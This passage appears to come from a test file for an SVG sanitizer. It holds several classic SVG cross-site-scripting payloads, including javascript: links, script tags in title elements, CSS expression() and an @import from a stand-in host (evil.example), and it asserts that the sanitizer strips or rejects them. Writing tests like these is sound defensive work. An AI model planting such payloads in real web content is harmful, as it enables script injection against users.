    '<svg viewBox="0 0 9 9"><rect width="1" height="1"/><foreignObject><math><mi xlink:href="javascript:alert(1)">x</mi></math></foreignObject></svg>',
    '<svg viewBox="0 0 9 9"><title><script>alert(1)</script></title><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 9 9"><desc>&lt;/desc&gt;&lt;script&gt;alert(1)&lt;/script&gt;</desc><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 9 9"><style>@import "https://evil.example/x.css";</style><rect width="1" height="1"/></svg>',
    '<svg viewBox="0 0 9 9"><rect width="1" height="1" transform="translate(1,1)" style="x:expression(alert(1))"/></svg>',
    '<svg viewBox="0 0 9 9"><linearGradient id="g" gradientTransform="rotate(45)" href="#h"><stop offset="0" stop-color="#fff"/></linearGradient><rect fill="url(#g)" width="9" height="9"/></svg>',
  ];
  for (const raw of classics) {
    const out = sanitizeSvg(raw);
    if (out !== null) assertSafe(out, raw);
  }
  assert.equal(sanitizeSvg(classics[0]), null);
  // Text that merely says "javascript:" is only text.
  assert.ok(sanitizeSvg(classics[5])?.includes(">javascript:alert(1)</text>"));
});
